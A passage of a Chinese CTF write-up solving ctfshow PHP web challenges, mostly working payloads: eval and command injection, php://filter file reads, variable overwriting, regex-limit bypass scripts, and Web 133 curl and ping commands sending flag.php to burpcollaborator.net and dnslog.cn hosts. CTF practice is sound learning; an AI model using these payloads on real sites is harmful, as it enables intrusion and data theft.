&amp;&amp; false);// false$a=true and false and false;var_dump($a); // true$b = true &amp;&amp; false &amp;&amp; false;var_dump($b); //false$c = true &amp; false &amp; false;var_dump($c); //bool(0) 1&lt;?php$a=true and false and false;var_dump($a); // trueif($a === true and false and false)&#123; echo &#x27;111&#x27;; //不输出&#125; 1&lt;?php$a=false and true and true;var_dump($a); if($a == false and true and true)&#123; echo &#x27;111&#x27;; &#125;//bool(false) 111 11. if($v0)绕过：v1 是数字2. v2 不能有分号，那么无法使用 命令执行函数，那么使用 ``3. 使用注释将 v3 注释掉，相当于把 (&#x27;ctfshow&#x27;) 注释掉4. 注意，v3 一定要写上 ; 1# payload?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;?v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=?&gt;&lt;?php echo `cat ctfshow.php`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=-system(&#x27;ls&#x27;)-&amp;v3=-1;?v1=1&amp;v2=echo&amp;v3=;system(&#x27;ls&#x27;); 构造成下面的感觉 查 ctfshow.php 试试 其中，0x2d 是 - 1.13 Web 101 — ReflectionClass 关于一个类的反射http://www.thinkphp.cn/code/4863.html 1修补100题非预期,替换0x2d 1&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; 上面的 v2 构造的符号 被过滤 构造 eval(echo new ReflectionClass(‘ctfshow’)); 1?v1=1&amp;v2=echo new ReflectionClass&amp;v3=; 1.14 Web 1021&lt;?phphighlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123; $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; file_put_contents($v3,$str);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 1 1.15 Web 1031 1.16 Web 104 — shal() 数组 [ ] 绕过1换个姿势 1&lt;?php highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2))&#123; echo $flag; &#125;&#125;?&gt; 1?v1=1?v2=1 1?v1[]=1?v2[]=2 1aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m 1.17 Web 105 — 变量覆盖1&lt;?php highlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123; if($key===&#x27;error&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value; &#125;foreach($_POST as $key =&gt; $value)&#123; if($value===&#x27;flag&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces);?&gt;你还想要flag嘛？ 1$$key=$$value; #变量覆盖，将值作为变量赋给键作为变量，如果传入，?suces=flag，即相当于 $suces=$flag，即将$flag的值赋给$suces，所以我只需要想办法 输出 $suces 即可 可以看到，仅仅传入以上内容，会显示 $error 报错，我们可以通过 POST传参，将 $flag 的值赋给 $error 即可 思考 通过 die(suces) 1get: suces=flagpost: flag= 通过 die(error) 1get: suces=flagpost: error=suces 1.15 Web 106 — shal() 数组 [ ] 绕过1&lt;?php highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123; echo $flag; &#125;&#125;?&gt; 1v1[]=1v2[]=2 1.16 Web 107 — parse_str()1&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v3 = $_GET[&#x27;v3&#x27;]; parse_str($v1,$v2); if($v2[&#x27;flag&#x27;]==md5($v3))&#123; echo $flag; &#125;&#125;?&gt; 1#parse_str($v1,$v2);把$1字符串解析到变量 $2当中，以数组形式get: ?v3=123456post: v1=flag=e10adc3949ba59abbe56e057f20f883e 1.17 Web 108 — ereg() 截断漏洞1&lt;?php highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123; die(&#x27;error&#x27;);&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123; echo $flag;&#125;?&gt;error 1#strrev()反转字符串#intval()获取变量整数值#0x36d 的十进制是 877 1ereg() 存在00截断漏洞，即%00之后的内容不会进行匹配函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配 1?c=sds%00778 1.18 Web 109 — $v1($v2()) 内置类1&lt;?php highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123; eval(&quot;echo new $v1($v2());&quot;); &#125;&#125;?&gt; 1#随便找个php中的内置类并且可以直接echo输出的就可以ExceptionReflectionClass?v1=ReflectionClass&amp;v2=system(&#x27;ls&#x27;)?v1=Exception&amp;v2=system(&#x27;ls&#x27;)?v1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)v1=Exception();system(&#x27;tac f*&#x27;);//&amp;v2=av1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;) 1.19 Web 110 — new $v1($v2())1&lt;?php highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123; die(&quot;error v2&quot;); &#125; eval(&quot;echo new $v1($v2());&quot;);&#125;?&gt; 1#FilesystemIterator类读取文件?v1=FilesystemIterator&amp;v2=getcwd 1.20 Web 111 — 变量覆盖 — $GLOBALS1变量覆盖 1&lt;?php highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123; eval(&quot;$$v1 = &amp;$$v2;&quot;); var_dump($$v1);&#125;if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123; die(&quot;error v2&quot;); &#125; if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123; getFlag($v1,$v2); &#125; &#125;?&gt; 超全局变量 $GLOBALS $GLOBALS — 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。 1array(8) &#123; [&quot;_GET&quot;]=&gt; array(0) &#123; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;GLOBALS&quot;]=&gt; array(8) &#123; [&quot;_GET&quot;]=&gt; array(0) &#123; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;a&quot;]=&gt; int(123) [&quot;b&quot;]=&gt; int(456) [&quot;c&quot;]=&gt; string(4) &quot;asdf&quot; &#125; [&quot;a&quot;]=&gt; int(123) [&quot;b&quot;]=&gt; int(456) [&quot;c&quot;]=&gt; string(4) &quot;asdf&quot;&#125; 1# payload?v1=ctfshow&amp;v2=GLOBALS# 将 $GLOBALS 赋值给 v2 , v2 再赋值给 v1 , 然后再 var_dump($v1)，就相当于 var_dump($GLOBALS) 1.21 Web 112 — 各种编码绕过 convert.iconv.UCS-2LE.UCS-2BE1&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123; if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123; die(&quot;hacker!&quot;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; 1&lt;?phpecho iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;);# ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;? 1# payload?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php# 得到 f$al=gc&quot;fthswod&#123;3c00bd-8cf124-2b-53b4da-72598e1bb4&#125;7;&quot;# 解码得到 flag https://www.php.net/manual/zh/mbstring.supported-encodings.php 1# 另解?file=php://filter/resource=flag.php?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php#?file=compress.bzip2://flag.php# 别的一些编码绕过?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php 1.22 Web 113 — /proc/self/root 多次重复1&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123; if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123; die(&#x27;hacker!&#x27;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; 1# 过滤 filter 可使用 zlib?file=compress.zlib://flag.php 1# 另解?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php# /proc/self/root 在 Linux 当中是指向根目录的 多次重复可绕过# ls /proc/self/root 得到的将会是根目录的文件 1.23 Web 114 — filter1&lt;?phperror_reporting(0);highlight_file(__FILE__); function filter($file)&#123; if(preg_match(&#x27;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123; die(&#x27;hacker!&#x27;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];echo &quot;师傅们居然tql都是非预期 哼！&quot;;if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; 师傅们居然tql都是非预期 哼！ 1# filter 未被过滤?file=php://filter/resource=flag.php 1.24 Web 115 — trim() %0c 绕过1&lt;?phpinclude(&#x27;flag.php&#x27;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123; $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num); return $num;&#125;$num=$_GET[&#x27;num&#x27;];if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123; if($num==&#x27;36&#x27;)&#123; echo $flag; &#125;else&#123; echo &quot;hacker!!&quot;; &#125;&#125;else&#123; echo &quot;hacker!!!&quot;;&#125; hacker!!! 1# 测试&lt;?phpfor ($i=0; $i &lt;=128 ; $i++) &#123; $x=chr($i).&#x27;1&#x27;; if(trim($x)!==&#x27;1&#x27; &amp;&amp; is_numeric($x))&#123; echo urlencode(chr($i)).&quot;\\n&quot;; &#125;&#125;# %0C %2B - . 0 1 2 3 4 5 6 7 8 9 1?num=%0c36 1.25 Web 123 — $a=$_SERVER[‘argv’];1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125;?&gt; 1# 变量名应该只有 字母、数字、下划线# GET 或 POST方式传进去的变量名,会自动将 空格 + . [ 转换为 _ ，重点是 仅仅替换一次 1# payloadfun=echo $flag&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=2fun=$fl0g=%27flag_give_me%27&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=2 #不行CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=var_dump($GLOBALS) #不行 $a=$_SERVER[‘argv’]; 11、cli模式（命令行）下 第一个参数$_SERVER[&#x27;argv&#x27;][0]是脚本名，其余的是传递给脚本的参数2、web网页模式下 在web页模式下必须在php.ini开启register_argc_argv配置项 设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果 这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’] $argv,$argc在web模式下不适用 1# 预期解get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])# 测试&lt;?php$a=$_SERVER[&#x27;argv&#x27;];var_dump($a);传入 a=1+fl0g=flag_give_me结果如下array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125; 1# 另解POST CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])GET /?$fl0g=flag_give_meGET:?$fl0g=flag_give_mePOST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0]) 1# 测试 Web php.ini开启register_argc_argv配置项 | 设置register_argc_argv = On 1.26 Web 125 — $a=$_SERVER[‘argv’];1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125;?&gt; 1get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1]) 1.27 Web 126 — $a=$_SERVER[‘argv’];1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125; 1get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1]) 1.28 Web 127 — extract($_GET); 和 空格 绕过 _1&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show = md5($flag);$url = $_SERVER[&#x27;QUERY_STRING&#x27;];//特殊字符检测function waf($url)&#123; if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $url))&#123; return true; &#125;else&#123; return false; &#125;&#125;if(waf($url))&#123; die(&quot;嗯哼？&quot;);&#125;else&#123; extract($_GET);&#125;if($ctf_show===&#x27;ilove36d&#x27;)&#123; echo $flag;&#125; ‘QUERY_STRING’ query string（查询字符串），如果有的话，通过它进行页面访问。 https://www.php.net/manual/zh/reserved.variables.server.php 1# + [ . 空格 会变成 _ # extract($_GET); 的作用即是将我们的 GET 传入的参数变成实打实的变量?ctf show=ilove36d 1.29 Web 128 — gettext 扩展 — get_defined_vars()1&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$f1 = $_GET[&#x27;f1&#x27;];$f2 = $_GET[&#x27;f2&#x27;];if(check($f1))&#123; var_dump(call_user_func(call_user_func($f1,$f2)));&#125;else&#123; echo &quot;嗯哼？&quot;;&#125;function check($str)&#123; return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);&#125; NULL gettext 扩展 查看php 扩展目录下是否有 php_gettext.dll 修改 php.ini extension=php_gettext.dll 去掉注释 php 下的 gettext 扩展使用 测试 1&lt;?phpecho gettext(&#x27;phpinfo&#x27;);echo _(&#x27;phpinfo&#x27;);?&gt;# 如果是未定义的字符，则将会返回原字符串root@kali:/var/www/html/learn# vi 3.phproot@kali:/var/www/html/learn# php 3.php phpinfophpinfo 1get_defined_vars( void) : array返回由所有已定义变量所组成的数组 # 测试&lt;?php$a = get_defined_vars();print_r($a);?&gt;# 返回Array( [_GET] =&gt; Array ( [ctfshow] =&gt; ilove36d ) [_POST] =&gt; Array ( ) [_COOKIE] =&gt; Array ( ) [_FILES] =&gt; Array ( ) [test] =&gt; Success!) 1?f1=_&amp;f2=get_defined_vars# 解释var_dump(call_user_func(call_user_func($f1,$f2)));var_dump(call_user_func(call_user_func(&#x27;_&#x27;,&#x27;get_defined_vars&#x27;)));var_dump(call_user_func(get_defined_vars)); 1.30 Web 129 — GET 中必须含有某内容1&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;f&#x27;]))&#123; $f = $_GET[&#x27;f&#x27;]; if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123; echo readfile($f); &#125;&#125; 1stripos() # 查找字符串在另一字符串中第一次出现的位置（不区分大小写）,从0开始 1# 解一# 远程文件包含 在自己的服务器上写上一句话 test.txt?f=http://url/test.txt?ctfshow 1# 解二# filter 伪协议?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php 1# 解三# 目录穿越?f=/ctfshow/../../../../../var/www/html/flag.php 1.31 Web 130 — 正则最大回溯次数绕过https://www.jb51.net/article/49631.htm 1very very very（省略25万个very）ctfshow 1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123; $f = $_POST[&#x27;f&#x27;]; if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123; die(&#x27;bye!&#x27;); &#125; if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123; die(&#x27;bye!!&#x27;); &#125; echo $flag;&#125; 考察点：利用正则最大回溯次数绕过 PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了 1import requestsurl=&quot;http://039253c3-1444-428e-9301-1eadc5f79ab4.challenge.ctf.show:8080/&quot;data=&#123; &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;&#125;r=requests.post(url,data=data)print(r.text) 1# 非预期解f=ctfshowf[]=ctfshow 1.32 Web 131 — 正则最大回溯次数绕过1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123; $f = (String)$_POST[&#x27;f&#x27;]; if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123; die(&#x27;bye!&#x27;); &#125; if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123; die(&#x27;bye!!&#x27;); &#125; echo $flag;&#125; 1import requestsurl=&quot;http://4a5d7bd2-7fc7-4a6f-90bd-8eef9693bf0a.challenge.ctf.show:8080/&quot;data=&#123; &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;36Dctfshow&#x27;&#125;r=requests.post(url,data=data)print(r.text) 1.33 Web 132 — false &amp;&amp; false || $username ===”admin”一个 Web 页面 扫描后台 1&lt;?php#error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123; $username = (String)$_GET[&#x27;username&#x27;]; $password = (String)$_GET[&#x27;password&#x27;]; $code = (String)$_GET[&#x27;code&#x27;]; if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123; if($code == &#x27;admin&#x27;)&#123; echo $flag; &#125; &#125;&#125; 1# payload?username=admin&amp;password=1&amp;code=admin 1.34 Web 133 — 无回显命令执行https://blog.csdn.net/qq_46091464/article/details/109095382 1&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123; if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123; eval(substr($F,0,6)); &#125;else&#123; die(&quot;6个字母都还不够呀?!&quot;); &#125;&#125; 分析 1如果传入 ?F=` $F`;sleep 5则 substr($F,0,6) 后得到 ` $F`;即执行 eval(` $F`;);也就是 eval(` ` $F`;sleep 5`;);而 `` 与 shell_exec() 一致则 eval(shell_exec(&quot; ` $F`;sleep 5&quot;));测试后 真的 执行了 sleep 5 题目转换成：无回显的命令执行 法一 1?F=`$F`;curl -X POST -F xx=@flag.php http://66ahgg5hlpg29qz2ehu6mn5hh8n1bq.burpcollaborator.net?F=`$F`;+curl -X POST -d&quot;flag=`cat flag.php`&quot; ewe2mcnzf0hwu1l4eepxt26nwe25qu.burpcollaborator.net 1#payload?F=`$F `;ping `ls | grep flag`.zdvlix.dnslog.cn -c 1?F=`$F `;ping `cat flag.php | grep flag`.zdvlix.dnslog.cn -c 1 1.35 Web 134 — _POST 数组覆盖1&lt;?phphighlight_file(__FILE__);$key1 = 0;$key2 = 0;if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123; die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);extract($_POST);if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123; die(file_get_contents(&#x27;flag.php&#x27;));&#125; 1# 测试&lt;?phpparse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);var_dump($_POST);# 传参 ?_POST[a]=123 1# payload?_POST[key1]=36d&amp;_POST[key2]=36d 1.36 Web 135 — 无回显命令执行 — 写文件 cp nl1web133plus 1&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123; if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123; eval(substr($F,0,6)); &#125;else&#123; die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;); &#125;&#125; 1# payload?F=`$F`; cp flag.php 1.txt# 然后访问 1.txt 即可?F=`$F `;nl f*&gt;2.txt 1.37 Web 136 — 无回显命令执行 — ls|tee xxx1&lt;?phperror_reporting(0);function check($x)&#123; if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; check($c); exec($c);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 1?c=ls|tee xxx 1# tee 命令 https://linux.cn/article-9435-1.htmlping www.baidu.com | tee 1.txt将正在执行命令的输出内容 写入 指定文件当中# 追加写入ping www.baidu.com | tee -a 1.txt# 写入多个文件当中ping www.baidu.com | tee 1.txt 2.txt 3.txtls | tee 2.txt 3.txt 4.txt # 让 tee 命令的输出内容直接作为另一个命令的输入内容 root@kali:/var/www/html/learn# ls *.txt | tee 5.txt | wc -l4 参考 https://linux.cn/article-9435-1.html 1?c=ls|tee xxx # 后访问 /xxx 将文件下载下来 得到当前目录之下 仅仅有 index.php 1?c=ls /|tee 111 1?c=cat /f149_15_h3r3|tee 222 1.38 Web 137 — call_user_func() 传递 字符串 — 类名::函数名1&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123; function __wakeup()&#123; die(&quot;private class&quot;); &#125; static function getFlag()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); 1# payloadctfshow=ctfshow::getFlagctfshow=ctfshow-&gt;getFlag #不可行 php中 -&gt;与:: 调用类中的成员的区别-&gt; 用于动态语境处理某个类的某个实例:: 可以调用一个静态的、不依赖于其他初始化的类方法. 也就是说双冒号可以不用实例化类就可以直接调用类中的方法 1.39 Web 138 — call_user_func() 传递 数组 